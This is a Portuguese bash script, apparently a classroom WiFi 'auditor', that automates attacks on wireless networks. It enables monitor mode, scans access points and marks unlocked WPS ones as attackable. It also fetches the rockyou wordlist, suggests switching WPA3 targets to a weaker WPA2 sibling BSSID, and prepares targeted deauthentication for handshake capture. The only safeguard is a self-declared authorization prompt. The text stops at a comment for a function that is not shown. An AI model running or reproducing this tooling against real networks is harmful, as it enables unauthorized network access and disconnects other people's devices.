#!/usr/bin/env bash
#
# auditor.sh — Auditor WiFi automatizado (desafio didático de redes)
#
# USO AUTORIZADO: ferramenta educacional para auditar UM ÚNICO AP escolhido
# pelo usuário, numa rede própria ou explicitamente autorizada (ex.: AP do
# laboratório configurado pelo professor). Pede confirmação antes de atacar.
#
# Rodar como root (precisa de airmon-ng, iw, nmcli, etc.):
#   sudo ./auditor.sh
#
set -uo pipefail
# (não uso "set -e" porque vários comandos de rede retornam códigos != 0 em
#  condições normais — ex.: handshake ainda não capturado — e eu preciso
#  tratar esses casos manualmente em vez de abortar o script inteiro.)

# ============================================================================
# 0. CONFIGURAÇÃO GERAL / CONSTANTES
# ============================================================================

WORKDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOGFILE="${WORKDIR}/auditoria.log"
RESPOSTAS="${WORKDIR}/respostas.txt"
CAPTURE_PREFIX="${WORKDIR}/captura"
SCAN_PREFIX="${WORKDIR}/scan"
WORDLIST_DIR="${WORKDIR}/wordlists"
ROCKYOU="${WORDLIST_DIR}/rockyou.txt"
ROCKYOU_URL="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"

# Variáveis de estado preenchidas ao longo do fluxo (nada hardcoded)
IFACE=""          # interface wifi física detectada (ex.: wlan0)
MONIFACE=""       # interface em modo monitor (ex.: wlan0mon) — NÃO assumir nome fixo
TARGET_ESSID=""
TARGET_BSSID=""
TARGET_CH=""
TARGET_ENC=""
TARGET_FREQ_LABEL=""
# BSSID "irmão" em WPA2 puro na mesma rádio física (quando o alvo é WPA3). Redes
# multi-SSID expõem vários BSSIDs no mesmo rádio que diferem em UM octeto só; se
# um deles for WPA2 puro, ele é atacável normalmente (o WPA3/SAE não é).
WPA2_SIBLING_BSSID=""
WPA2_SIBLING_CH=""
WPA2_SIBLING_ESSID=""
SENHA_ENCONTRADA=""
ROTA_USADA=""
IP_ROTEADOR=""
SOMENTE_DADOS=0
MONITOR_MODE_ATIVO=0   # controla o cleanup: só restaura se realmente entrou em modo monitor
HANDSHAKE_CAP=""        # captura validada para o BSSID atual; reutilizada entre rotas
DEAUTH_ESTADO="nao_solicitado"
LOCKFILE="/run/lock/wifi-auditor.lock"
SESSION_ID="$(date '+%Y%m%d%H%M%S')-$$"
CLEANUP_FEITO=0        # garante que a limpeza rode UMA vez (Ctrl+C disparava INT e depois EXIT)

# Máscara informada na Rota A — reutilizada pela Rota D (PMKID) para quebrar
# o hash capturado sem depender de handshake/cliente conectado.
MASK_KIND=""     # "", "crunch" ou "hashcat"
MASK_STR=""      # a máscara em si
MASK_CUSTOM=""   # charset custom -1 (só hashcat)
MASK_TAM=""      # tamanho min/max do crunch (só crunch)

# ============================================================================
# 1. LOG / UTILITÁRIOS
# ============================================================================

log() {
    # Grava com timestamp em auditoria.log E mostra na tela
    local msg="$1"
    echo "[$(date '+%H:%M:%S')][sessão:${SESSION_ID}] ${msg}" | tee -a "$LOGFILE"
}

erro() {
    echo "[$(date '+%H:%M:%S')][sessão:${SESSION_ID}][ERRO] $1" | tee -a "$LOGFILE" >&2
}

pausar_enter() {
    read -rp "Pressione ENTER para continuar..." _
}

confirmar() {
    # Pergunta sim/no; só aceita "sim" explicitamente (case-insensitive)
    local pergunta="$1"
    local resposta
    read -rp "${pergunta} [sim/não]: " resposta
    [[ "${resposta,,}" == "sim" ]]
}

# ============================================================================
# 2. CLEANUP — restaura a placa de rede ao estado normal, mesmo se der erro
#    (trap garante que isso rode ao sair do script por qualquer motivo)
# ============================================================================

cleanup() {
    # Idempotente: ao dar Ctrl+C, o bash dispara o trap em INT e DE NOVO em EXIT,
    # o que rodava a limpeza (e o restart do NetworkManager) duas vezes seguidas.
    # Desarmamos o trap e marcamos a flag para só rodar uma vez.
    [[ "${CLEANUP_FEITO}" -eq 1 ]] && return
    CLEANUP_FEITO=1
    trap - EXIT INT TERM

    log "Executando limpeza / restauração da interface..."

    if [[ -n "${MONIFACE}" ]] && iw dev "${MONIFACE}" info &>/dev/null; then
        log "Parando modo monitor em ${MONIFACE}..."
        airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
    fi

    if [[ "${MONITOR_MODE_ATIVO}" -eq 1 ]]; then
        log "Religando NetworkManager para restaurar conectividade normal..."
        systemctl restart NetworkManager &>>"$LOGFILE" || service network-manager restart &>>"$LOGFILE"
        sleep 2
        MONITOR_MODE_ATIVO=0
    fi

    log "Limpeza concluída. Log completo em: ${LOGFILE}"
}
# EXIT roda a limpeza ao final normal. INT/TERM (Ctrl+C ou kill) precisam, ALÉM
# de limpar, ENCERRAR o processo: sem o exit, o bash voltava do trap para o loop
# de captura e seguia tentando numa interface já derrubada pela limpeza (as
# "Tentativas" continuavam após "Executando limpeza"). cleanup é idempotente e
# desarma os traps, então o exit abaixo NÃO redispara a limpeza no EXIT.
trap cleanup EXIT
trap 'cleanup; exit 130' INT
trap 'cleanup; exit 143' TERM

# ============================================================================
# 3. VERIFICAÇÃO DE DEPENDÊNCIAS
# ============================================================================

verificar_dependencias() {
    log "Verificando dependências..."
    local pacotes=(aircrack-ng reaver pixiewps hashcat crunch hcxtools hcxdumptool tcpdump)
    local faltando=()

    for p in "${pacotes[@]}"; do
        if ! dpkg -s "$p" &>/dev/null; then
            faltando+=("$p")
        fi
    done

    if [[ ${#faltando[@]} -gt 0 ]]; then
        log "Pacotes faltando: ${faltando[*]}. Instalando..."
        apt-get update &>>"$LOGFILE"
        apt-get install -y "${faltando[@]}" &>>"$LOGFILE" \
            || { erro "Falha ao instalar dependências. Veja ${LOGFILE}."; exit 1; }
    else
        log "Todas as dependências já instaladas."
    fi

    # hcxpcapngtool pode vir em pacote hcxtools (nome do binário varia por versão)
    if ! command -v hcxpcapngtool &>/dev/null; then
        log "Aviso: binário hcxpcapngtool não encontrado no PATH mesmo após instalar hcxtools."
    fi
}

# ============================================================================
# 4. WORDLIST — baixar ENQUANTO ainda há internet (antes do modo monitor)
# ============================================================================

garantir_wordlist() {
    mkdir -p "${WORDLIST_DIR}"
    if [[ -s "${ROCKYOU}" ]]; then
        log "rockyou.txt já existe em ${ROCKYOU}."
        return
    fi

    # Procurar uma cópia já instalada no sistema (comum em Kali/alguns setups)
    for caminho in /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt.gz; do
        if [[ -s "$caminho" ]]; then
            log "Encontrada wordlist do sistema em ${caminho}."
            if [[ "$caminho" == *.gz ]]; then
                gunzip -c "$caminho" > "${ROCKYOU}"
            else
                cp "$caminho" "${ROCKYOU}"
            fi
            return
        fi
    done

    log "rockyou.txt não encontrada. Baixando agora (ainda com internet ativa)..."
    if curl -fL --progress-bar -o "${ROCKYOU}.tmp" "${ROCKYOU_URL}"; then
        mv "${ROCKYOU}.tmp" "${ROCKYOU}"
        log "Wordlist baixada com sucesso: ${ROCKYOU}"
    else
        erro "Falha ao baixar rockyou.txt. A rota de dicionário (Rota C) pode falhar depois."
        rm -f "${ROCKYOU}.tmp"
    fi
}

# ============================================================================
# 5. DETECTAR INTERFACE WIFI (nunca assumir wlan0)
# ============================================================================

detectar_interface() {
    log "Detectando interfaces WiFi disponíveis..."
    mapfile -t interfaces < <(iw dev | awk '/Interface/{print $2}')

    if [[ ${#interfaces[@]} -eq 0 ]]; then
        erro "Nenhuma interface WiFi encontrada (iw dev não listou nada)."
        exit 1
    elif [[ ${#interfaces[@]} -eq 1 ]]; then
        IFACE="${interfaces[0]}"
        log "Interface única detectada: ${IFACE}"
    else
        echo "Mais de uma interface WiFi encontrada:"
        local i=1
        for ifc in "${interfaces[@]}"; do
            echo "  [$i] $ifc"
            ((i++))
        done
        local escolha
        read -rp "Escolha o número da interface a usar: " escolha
        IFACE="${interfaces[$((escolha-1))]}"
    fi

    if [[ -z "${IFACE}" ]]; then
        erro "Interface inválida selecionada."
        exit 1
    fi
    log "Usando interface física: ${IFACE}"
    avisar_driver_fraco
}

# Alguns drivers (em especial Realtek rtw88/RTL88xx) têm modo monitor e, pior,
# INJEÇÃO de pacotes instáveis ou quebrados. Isso impacta direto deauth, WPS e
# PMKID (que dependem de injetar quadros) e também o scan (perde beacons ao
# trocar de canal). Avisamos cedo em vez de falhar silenciosamente mais adiante.
avisar_driver_fraco() {
    local drv=""
    drv="$(basename "$(readlink -f "/sys/class/net/${IFACE}/device/driver" 2>/dev/null)" 2>/dev/null)"
    [[ -z "$drv" || "$drv" == "driver" ]] && return 0
    log "Driver da interface ${IFACE}: ${drv}"
    if [[ "$drv" =~ ^(rtw88|rtw89|rtl8821|rtl8812|rtl8188|rtl8192|8821|8812|8188|8192) ]]; then
        echo
        echo ">>> AVISO: o driver '${drv}' é de uma placa Realtek com modo monitor e"
        echo ">>> INJEÇÃO de pacotes historicamente instáveis. Consequências práticas:"
        echo ">>>   - deauth/WPS/PMKID podem não injetar nada (falham sem erro claro);"
        echo ">>>   - o scan pode perder redes ao trocar de canal (lista incompleta)."
        echo ">>> A captura passiva de handshake (quando alguém conecta) ainda costuma"
        echo ">>> funcionar. Se possível, use um adaptador com injeção confiável."
        echo
    fi
}

# ============================================================================
# 6. MODO MONITOR
# ============================================================================

entrar_modo_monitor() {
    log "Ajustando região regulatória para BR (habilita canais DFS/5GHz corretamente)..."
    timeout --kill-after=3 10s iw reg set BR &>>"$LOGFILE" || log "Aviso: não foi possível setar região regulatória."

    echo
    echo ">>> AVISO: a internet desta máquina vai cair agora (modo monitor)."
    echo ">>> Isso é esperado e normal. Será restaurado ao final."
    echo ">>> Se travar ou a rede não voltar, rode: $0 --restaurar"
    echo

    log "Matando processos que podem interferir (NetworkManager, wpa_supplicant)..."
    timeout --kill-after=5 20s airmon-ng check kill &>>"$LOGFILE"
    if [[ $? -eq 124 ]]; then
        log "Aviso: 'airmon-ng check kill' não respondeu em 20s, seguindo assim mesmo."
    fi

    # Snapshot ANTES de ativar o modo monitor: assim identificamos a
    # interface pelo que MUDOU (apareceu/desapareceu), não só por conter
    # "mon" no nome — uma interface monitor de uma execução anterior que
    # travou (e não foi limpa por "--restaurar") também bate nesse critério
    # e fazia o script pegar a interface errada, silenciosamente, deixando
    # a captura vazia mais adiante (parece travado, mas é a placa errada).
    local antes
    antes="$(iw dev | awk '/Interface/{print $2}')"

    log "Ativando modo monitor em ${IFACE}..."
    timeout --kill-after=5 20s airmon-ng start "${IFACE}" &>>"$LOGFILE"
    if [[ $? -eq 124 ]]; then
        erro "'airmon-ng start' travou por mais de 20s. A placa pode estar presa em modo"
        erro "monitor de uma execução anterior. Rode: $0 --restaurar"
        exit 1
    fi

    # NÃO hardcodar "${IFACE}mon" — descobrir o nome real criado
    sleep 2
    local depois novas
    depois="$(iw dev | awk '/Interface/{print $2}')"
    novas="$(comm -13 <(echo "${antes}" | sort) <(echo "${depois}" | sort))"
    MONIFACE="$(echo "${novas}" | grep -i 'mon' | head -n1)"

    if [[ -z "${MONIFACE}" ]]; then
        # Algumas versões do airmon-ng não renomeiam a interface (mantém o nome original em modo monitor)
        if iw dev "${IFACE}" info 2>/dev/null | grep -qi "type monitor"; then
            MONIFACE="${IFACE}"
        else
            erro "Não foi possível identificar a interface em modo monitor."
            exit 1
        fi
    fi

    MONITOR_MODE_ATIVO=1
    log "Interface em modo monitor: ${MONIFACE}"
}

# Verifica se a interface monitor ainda existe; recria se tiver sumido
# (lição aprendida: wlanXmon pode desaparecer após certos comandos)
garantir_moniface_viva() {
    if ! iw dev "${MONIFACE}" info &>/dev/null; then
        log "Interface ${MONIFACE} não existe mais. Recriando modo monitor..."
        airmon-ng start "${IFACE}" &>>"$LOGFILE"
        sleep 2
        MONIFACE="$(iw dev | awk '/Interface/{print $2}' | grep -i 'mon' | head -n1)"
        [[ -z "${MONIFACE}" ]] && MONIFACE="${IFACE}"
        log "Interface monitor recriada: ${MONIFACE}"
    fi
}

# ============================================================================
# 7. SCAN DE REDES (2.4 GHz + 5 GHz) E ESCOLHA DO ALVO
# ============================================================================

escanear_e_escolher_alvo() {
    garantir_moniface_viva
    # 25s (antes 15s): com --band abg o airodump salta ~38 canais (2.4+5GHz),
    # dwell de ~250ms cada. Em 15s dava só ~1,5 varreduras e redes fracas (e o
    # canal do alvo) escapavam — por isso a lista da etapa 1 vinha incompleta e
    # divergia do que aparecia depois, já travado num canal, na captura.
    log "Escaneando redes nas bandas a/b/g (2.4 GHz e 5 GHz) por 25s..."

    rm -f "${SCAN_PREFIX}"*.csv "${SCAN_PREFIX}"*.cap "${SCAN_PREFIX}"*.kismet.* 2>/dev/null

    # --kill-after força SIGKILL se o processo não morrer com SIGTERM dentro
    # de 5s extras — sem isso, "timeout" pode ficar esperando pra sempre se
    # o airodump-ng não terminar limpo (ex.: travado restaurando o terminal).
    timeout --kill-after=5 25s airodump-ng --band abg --write-interval 1 \
        --write "${SCAN_PREFIX}" --output-format csv "${MONIFACE}" &>>"$LOGFILE"
    local scan_rc=$?
    if [[ $scan_rc -ne 0 && $scan_rc -ne 124 && $scan_rc -ne 137 ]]; then
        erro "O processo de scan terminou com erro (rc=${scan_rc}). Veja ${LOGFILE}."
        exit 1
    fi

    local csv="${SCAN_PREFIX}-01.csv"
    if [[ ! -f "$csv" ]]; then
        erro "Arquivo de scan não foi gerado (${csv})."
        exit 1
    fi

    # O CSV do airodump tem duas seções (APs e depois Clientes), separadas por
    # linha vazia. Extraímos só a seção de APs.
    # Colunas relevantes: BSSID, ..., channel, ..., privacy, ..., Power, ..., ESSID
    mapfile -t linhas_ap < <(awk -F', ' '
        /^Station MAC/ { exit }
        NF > 10 && $1 ~ /^[0-9A-Fa-f]{2}:/ { print }
    ' "$csv")

    if [[ ${#linhas_ap[@]} -eq 0 ]]; then
        erro "Nenhum AP encontrado no scan. Tente rodar de novo (sinal fraco?)."
        exit 1
    fi

    # Parseia cada linha em: BSSID, Channel, Privacy, Power, ESSID
    # "=()" é obrigatório aqui: "declare -a x" sem atribuição deixa a variável
    # como "unset" para o bash sob `set -u` até que um índice seja atribuído.
    # Se o scan rejeitar TODAS as linhas (0 redes aceitas), "${#lista_bssid[@]}"
    # mais abaixo dispara "unbound variable" em vez de mostrar o erro amigável.
    declare -a lista_bssid=() lista_ch=() lista_enc=() lista_pwr=() lista_essid=()
    declare -A bssid_visto

    local rejeitadas=0
    for linha in "${linhas_ap[@]}"; do
        IFS=',' read -ra campos <<< "$linha"
        # índices do formato padrão airodump CSV (0-based):
        # 0 BSSID, 3 channel, 4 speed, 5 privacy, 6 cipher, 7 auth, 8 power, 9 #beacons
        local bssid ch privacy power essid beacons
        bssid="$(echo "${campos[0]}" | xargs)"
        if [[ ${#campos[@]} -lt 14 || ! "$bssid" =~ ^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$ ]]; then
            ((rejeitadas++))
            continue
        fi
        ch="$(echo "${campos[3]}" | xargs)"
        privacy="$(echo "${campos[5]}" | xargs)"
        power="$(echo "${campos[8]}" | xargs)"
        beacons="$(echo "${campos[9]}" | xargs)"
        idlen="$(echo "${campos[12]}" | xargs)"
        # O CSV do airodump sempre termina em "..., ID-length, ESSID, Key".
        # O último campo (Key) costuma vir vazio — o ESSID é o penúltimo.
        # (usar $NF pegava o campo "Key" vazio, deixando tudo como <oculto>)
        essid="$(echo "${campos[-2]}" | xargs)"

        [[ -z "$bssid" ]] && continue

        # Descarta "fantasmas": BSSID visto só em frame de DADOS/probe de um
        # cliente, sem NUNCA ter um SSID anunciado detectado — nem mesmo oculto.
        # "ID-length == 0" é o sinal confiável disso (sem SSID == sem beacon real
        # processado). "# beacons == 0" NÃO é confiável: em scans rápidos (dwell
        # curto por canal, muitos canais 2.4+5GHz) é comum o airodump nunca
        # "flagrar" o beacon em si de uma rede real, mas ainda captar dados/IVs e
        # o Privacy/ESSID por outra via — descartar por beacons==0 jogava fora
        # redes reais (ex.: TP-Link_Extender_5GHz, VIVOFIBRA-2D7C-5G com WPA2/
        # CCMP/PSK e sinal válido, mas beacons=0 no CSV).
        if [[ "$idlen" =~ ^[0-9]+$ ]] && (( idlen == 0 )); then
            continue
        fi
        # Sem canal válido não dá nem pra travar a captura depois — ignora.
        if ! [[ "$ch" =~ ^[0-9]+$ ]] || (( ch <= 0 )); then
            continue
        fi
        # De-duplica por BSSID (mantém a 1ª ocorrência) por segurança.
        [[ -n "${bssid_visto[$bssid]:-}" ]] && continue
        bssid_visto[$bssid]=1

        lista_bssid+=("$bssid")
        lista_ch+=("$ch")
        lista_enc+=("$privacy")
        lista_pwr+=("${power:--100}")
        lista_essid+=("${essid:-<oculto>}")
    done

    if [[ ${#lista_bssid[@]} -eq 0 ]]; then
        erro "Só apareceram entradas fantasma (0 beacons) no scan — nenhuma rede real."
        erro "Rode de novo (sinal fraco / driver perdendo beacons ao trocar de canal)."
        exit 1
    fi
    log "Scan concluído: fonte=airodump-ng arquivo=$(basename "$csv") aceitas=${#lista_bssid[@]} rejeitadas=${rejeitadas}."

    # --- Coluna CLIENT: conta estações associadas por BSSID, direto da seção
    # "Station MAC" do mesmo CSV do scan. Exclui o artefato de airodump em que
    # o próprio AP aparece "associado a si mesmo" (mesmo BSSID na coluna de
    # estação e na de AP associado) — não é um cliente real.
    declare -A client_map
    local em_estacoes=0 st_mac bssid_assoc
    local -a campos_st
    while IFS= read -r linha; do
        if [[ "$linha" == Station\ MAC* ]]; then
            em_estacoes=1
            continue
        fi
        [[ $em_estacoes -eq 1 ]] || continue
        IFS=',' read -ra campos_st <<< "$linha"
        [[ ${#campos_st[@]} -ge 6 ]] || continue
        st_mac="$(echo "${campos_st[0]}" | xargs | tr '[:lower:]' '[:upper:]')"
        bssid_assoc="$(echo "${campos_st[5]}" | xargs | tr '[:lower:]' '[:upper:]')"
        [[ "$bssid_assoc" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
        [[ "$st_mac" == "$bssid_assoc" ]] && continue
        client_map["$bssid_assoc"]=$(( ${client_map["$bssid_assoc"]:-0} + 1 ))
    done < "$csv"

    # --- Coluna WPS: duas passagens curtas de "wash" (2.4GHz e 5GHz, já que
    # ele não varre as duas bandas ao mesmo tempo) sobre os BSSIDs já
    # encontrados. Ausência na saída == sem WPS; "Lck=No" == desbloqueado
    # (atacável); "Lck=Yes" == bloqueado.
    log "Verificando WPS nos APs encontrados (wash, ~16s)..."
    declare -A wps_lck
    local wash_out
    wash_out="$(timeout --kill-after=3 8s wash -i "${MONIFACE}" 2>>"$LOGFILE")"$'\n'
    wash_out+="$(timeout --kill-after=3 8s wash -i "${MONIFACE}" -5 2>>"$LOGFILE")"
    while IFS= read -r linha; do
        [[ "$linha" =~ ^([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}) ]] || continue
        wps_lck["${BASH_REMATCH[1]^^}"]="$(echo "$linha" | awk '{print $5}')"
    done <<< "$wash_out"

    # Ordena índices por potência (mais perto de 0 = sinal melhor) no topo
    mapfile -t ordem < <(
        for i in "${!lista_pwr[@]}"; do
            echo "${lista_pwr[$i]} $i"
        done | sort -rn | awk '{print $2}'
    )

    echo
    echo "=============== REDES ENCONTRADAS ==============="
    printf "%-4s %-20s %-18s %-5s %-6s %-6s %-6s %-4s\n" "Nº" "ESSID" "BSSID" "CH" "ENC" "PWR" "WPS" "CLI"
    local n=1 bssid_up lck_val wps_label cli_n
    declare -A idx_map
    for i in "${ordem[@]}"; do
        bssid_up="${lista_bssid[$i]^^}"
        lck_val="${wps_lck[$bssid_up]:-}"
        case "$lck_val" in
            "") wps_label="não" ;;
            No|no) wps_label="SIM" ;;
            Yes|yes) wps_label="bloq" ;;
            *) wps_label="sim?" ;;
        esac
        cli_n="${client_map[$bssid_up]:-0}"
        printf "%-4s %-20s %-18s %-5s %-6s %-6s %-6s %-4s\n" \
            "$n" "${lista_essid[$i]:0:20}" "${lista_bssid[$i]}" "${lista_ch[$i]}" "${lista_enc[$i]}" "${lista_pwr[$i]}" "$wps_label" "$cli_n"
        idx_map[$n]=$i
        ((n++))
    done
    echo "==================================================="
    echo "(WPS: SIM=desbloqueado/atacável, bloq=bloqueado, não=sem WPS detectado, sim?=detectado mas status incerto)"
    echo

    local escolha
    read -rp "Escolha o número do AP alvo: " escolha
    local idx="${idx_map[$escolha]:-}"
    if [[ -z "$idx" ]]; then
        erro "Escolha inválida."
        exit 1
    fi

    TARGET_ESSID="${lista_essid[$idx]}"
    TARGET_BSSID="${lista_bssid[$idx]}"
    TARGET_CH="${lista_ch[$idx]}"
    TARGET_ENC="${lista_enc[$idx]}"

    # Canais 5 GHz são todos >= 36; 2.4 GHz são todos <= 14. O regex antigo
    # não casava a faixa 100-129 e marcava esses canais como 2.4 GHz.
    if [[ "$TARGET_CH" =~ ^[0-9]+$ ]] && (( TARGET_CH >= 36 )); then
        TARGET_FREQ_LABEL="5 GHz"
    else
        TARGET_FREQ_LABEL="2.4 GHz"
    fi

    log "Alvo escolhido: ESSID=${TARGET_ESSID} BSSID=${TARGET_BSSID} CH=${TARGET_CH} ENC=${TARGET_ENC} (${TARGET_FREQ_LABEL})"

    # Se o alvo é WPA3, procura nas redes já escaneadas um BSSID IRMÃO em WPA2
    # puro (mesma rádio: difere em 1 octeto). Esse lado WPA2 é atacável de forma
    # convencional, ao contrário do SAE. Se existir, oferece trocar o alvo.
    detectar_irmao_wpa2 lista_bssid lista_ch lista_enc lista_essid

    avisar_limitacoes_cripto
}

# Conta em quantos octetos dois BSSIDs diferem (0 a 6). Vale-MAC virtual de
# multi-SSID normalmente difere em UM octeto (o 1º, com o bit "localmente
# administrado", ou o último) — por isso "diff == 1" é a assinatura de irmão.
_bssid_diff_octets() {
    local a="${1^^}" b="${2^^}"
    local -a oa ob
    IFS=':' read -ra oa <<< "$a"
    IFS=':' read -ra ob <<< "$b"
    local diff=0 i
    for i in 0 1 2 3 4 5; do
        [[ "${oa[$i]:-x}" != "${ob[$i]:-y}" ]] && ((diff++))
    done
    echo "$diff"
}

# Procura, entre os APs escaneados, um BSSID irmão do alvo (difere em 1 octeto)
# que seja WPA2 PURO (tem WPA2, NÃO tem WPA3/SAE). Recebe os NOMES dos arrays
# paralelos (passagem por nameref) porque eles são locais ao escaneamento.
detectar_irmao_wpa2() {
    local -n _bssid=$1 _ch=$2 _enc=$3 _essid=$4
    WPA2_SIBLING_BSSID=""; WPA2_SIBLING_CH=""; WPA2_SIBLING_ESSID=""

    # Só faz sentido quando o alvo é WPA3.
    local alvo_up="${TARGET_ENC^^}"
    [[ "$alvo_up" == *WPA3* || "$alvo_up" == *SAE* ]] || return 0

    local i enc_up
    for i in "${!_bssid[@]}"; do
        [[ "${_bssid[$i]}" == "$TARGET_BSSID" ]] && continue
        enc_up="${_enc[$i]^^}"
        # WPA2 puro: tem WPA2 e NÃO tem WPA3 nem SAE.
        [[ "$enc_up" == *WPA2* && "$enc_up" != *WPA3* && "$enc_up" != *SAE* ]] || continue
        # Mesmo rádio físico: difere do alvo em exatamente 1 octeto.
        [[ "$(_bssid_diff_octets "$TARGET_BSSID" "${_bssid[$i]}")" == "1" ]] || continue

        WPA2_SIBLING_BSSID="${_bssid[$i]}"
        WPA2_SIBLING_CH="${_ch[$i]}"
        WPA2_SIBLING_ESSID="${_essid[$i]}"
        log "BSSID irmão em WPA2 puro detectado: ${WPA2_SIBLING_BSSID} (CH ${WPA2_SIBLING_CH}, ESSID ${WPA2_SIBLING_ESSID})."
        break
    done

    [[ -z "$WPA2_SIBLING_BSSID" ]] && return 0

    echo
    echo ">>> DICA: o alvo é WPA3 (não quebra por dicionário), mas há um BSSID na"
    echo ">>> MESMA rádio física em WPA2 PURO — e esse SIM é atacável do jeito normal:"
    echo ">>>    WPA2 irmão: ${WPA2_SIBLING_ESSID}  ${WPA2_SIBLING_BSSID}  (canal ${WPA2_SIBLING_CH})"
    echo
    local troca=""
    read -rp "Mirar o BSSID WPA2 irmão em vez do WPA3? [s/N]: " troca
    if [[ "$troca" =~ ^[Ss]$ ]]; then
        TARGET_ESSID="$WPA2_SIBLING_ESSID"
        TARGET_BSSID="$WPA2_SIBLING_BSSID"
        TARGET_CH="$WPA2_SIBLING_CH"
        TARGET_ENC="WPA2"
        if [[ "$TARGET_CH" =~ ^[0-9]+$ ]] && (( TARGET_CH >= 36 )); then
            TARGET_FREQ_LABEL="5 GHz"
        else
            TARGET_FREQ_LABEL="2.4 GHz"
        fi
        # Já trocou: zera para não re-sugerir o mesmo no aviso seguinte.
        WPA2_SIBLING_BSSID=""; WPA2_SIBLING_CH=""; WPA2_SIBLING_ESSID=""
        log "Alvo TROCADO para o irmão WPA2: ESSID=${TARGET_ESSID} BSSID=${TARGET_BSSID} CH=${TARGET_CH} ENC=${TARGET_ENC} (${TARGET_FREQ_LABEL})"
    else
        log "Usuário manteve o alvo WPA3 (${TARGET_BSSID}) apesar do irmão WPA2 disponível."
    fi
}

# Avisa quando o alvo usa WPA3/SAE. Isso muda o jogo e o script não deve fingir
# que as rotas normais vão funcionar:
#   - deauth é protegido por PMF/802.11w no WPA3 → o cliente ignora os quadros;
#   - o handshake SAE (Dragonfly) NÃO é quebrável por dicionário/máscara como o
#     4-way do WPA2 — hashcat -m 22000 e aircrack atacam EAPOL/PMKID do WPA2,
#     não o SAE. As rotas A/C/D só têm chance pelo lado WPA2 de uma rede em
#     "modo transição" (WPA3 WPA2), se algum cliente conectar via WPA2.
avisar_limitacoes_cripto() {
    local enc_up="${TARGET_ENC^^}"
    if [[ "$enc_up" == *WPA3* || "$enc_up" == *SAE* ]]; then
        echo
        echo ">>> AVISO: o alvo usa WPA3/SAE (${TARGET_ENC})."
        echo ">>>   - deauth é protegido por PMF/802.11w → será IGNORADO pelo cliente;"
        echo ">>>   - o handshake SAE NÃO quebra por dicionário/máscara (diferente do WPA2)."
        if [[ "$enc_up" == *WPA2* ]]; then
            echo ">>> Como a rede está em modo transição (WPA3 WPA2), ainda há uma chance"
            echo ">>> SE um cliente conectar pelo lado WPA2 — aí sim o 4-way vira atacável."
            echo ">>> (clientes que suportam WPA3 preferem SAE, então isso é raro)."
        else
            echo ">>> Esta rede é WPA3 puro: as rotas de dicionário/máscara/PMKID não se"
            echo ">>> aplicam. Siga ciente de que provavelmente não vão encontrar a senha."
        fi
        if [[ -n "$WPA2_SIBLING_BSSID" ]]; then
            echo ">>> Lembrete: há um BSSID WPA2 PURO na mesma rádio (${WPA2_SIBLING_BSSID},"
            echo ">>> canal ${WPA2_SIBLING_CH}) — esse é o alvo realista, não o WPA3 atual."
        fi
        echo
    fi
}

# ============================================================================
# 8. CONFIRMAÇÃO DE AUTORIZAÇÃO (obrigatória antes de qualquer ataque)
# ============================================================================

confirmar_autorizacao() {
    echo
    echo "=================================================================="
    echo " Você está sobre o ponto de executar uma auditoria/ataque WiFi    "
    echo " contra o AP:                                                     "
    echo "   ESSID:  ${TARGET_ESSID}"
    echo "   BSSID:  ${TARGET_BSSID}"
    echo "=================================================================="
    echo " Isso só é permitido se esta rede for:                            "
    echo "   (a) sua própria rede, OU                                       "
    echo "   (b) uma rede de laboratório/sala explicitamente autorizada     "
    echo "       pelo professor para este exercício didático.               "
    echo "=================================================================="
    if ! confirmar "Esta rede é SUA ou está EXPLICITAMENTE AUTORIZADA para este teste?"; then
        erro "Autorização não confirmada. Abortando antes de qualquer ataque."
        exit 1
    fi
    log "Autorização confirmada pelo usuário para o alvo ${TARGET_BSSID}."
}

# ============================================================================
# 9. CAPTURA DE HANDSHAKE (sub-rotina usada pelas rotas A e C)
# ============================================================================

# Verifica, no CSV gerado pelo airodump-ng, se existe algum cliente (seção
# "Station MAC") associado ao BSSID alvo. Sem cliente associado, deauth não
# tem efeito nenhum (não há quem reconectar) — detectar isso cedo evita
# gastar os 60s de tentativas de deauth à toa.
ha_cliente_conectado() {
    # Lê o CSV de captura MAIS RECENTE (airodump pode gravar -01, -02, ...),
    # excluindo os formatos auxiliares .kismet.csv e .log.csv. Antes o nome era
    # fixo em "-01", então quando o airodump pulava para -02 a detecção lia um
    # arquivo inexistente e nunca via o cliente associado.
    local csv
    csv="$(ls -t "${CAPTURE_PREFIX}"-[0-9]*.csv 2>/dev/null | grep -vE '\.(kismet|log)\.csv$' | head -1)"
    [[ -n "$csv" && -f "$csv" ]] || return 1
    local em_estacoes=0 linha bssid_associado ultimo_visto visto_epoch idade
    local -a campos
    local agora_epoch
    agora_epoch="$(date +%s)"
    while IFS= read -r linha; do
        if [[ "$linha" == Station\ MAC* ]]; then
            em_estacoes=1
            continue
        fi
        [[ $em_estacoes -eq 1 ]] || continue
        IFS=',' read -ra campos <<< "$linha"
        [[ ${#campos[@]} -ge 6 ]] || continue
        bssid_associado="$(echo "${campos[5]}" | xargs)"
        [[ "${bssid_associado,,}" == "${TARGET_BSSID,,}" ]] || continue
        # Artefato comum do airodump: o próprio AP (frames de gerência/broadcast
        # mal-classificados) aparece como "estação" associada a si mesmo —
        # Station MAC == BSSID. Isso NÃO é um cliente real; sem filtrar, o
        # script "detecta cliente" e manda deauth com -c <próprio BSSID>, que
        # não derruba ninguém de verdade.
        local station_mac
        station_mac="$(echo "${campos[0]}" | xargs)"
        [[ "${station_mac,,}" == "${TARGET_BSSID,,}" ]] && continue
        ultimo_visto="$(echo "${campos[2]}" | xargs)"
        visto_epoch="$(date -d "$ultimo_visto" +%s 2>/dev/null)" || continue
        idade=$(( agora_epoch - visto_epoch ))
        if (( idade >= -2 && idade <= 20 )); then
            return 0
        fi
    done < "$csv"
    return 1
}

# Ecoa o MAC do PRIMEIRO cliente associado ao BSSID alvo (ou nada). Deauth
# broadcast (-a BSSID só) é largamente ignorado por clientes modernos; deauth
# DIRECIONADO a um cliente específico (-a BSSID -c CLIENTE) é muito mais eficaz
# pra forçar a reconexão que gera o handshake. O CSV tem o MAC na coluna 1 da
# seção de estações e o BSSID associado na coluna 6.
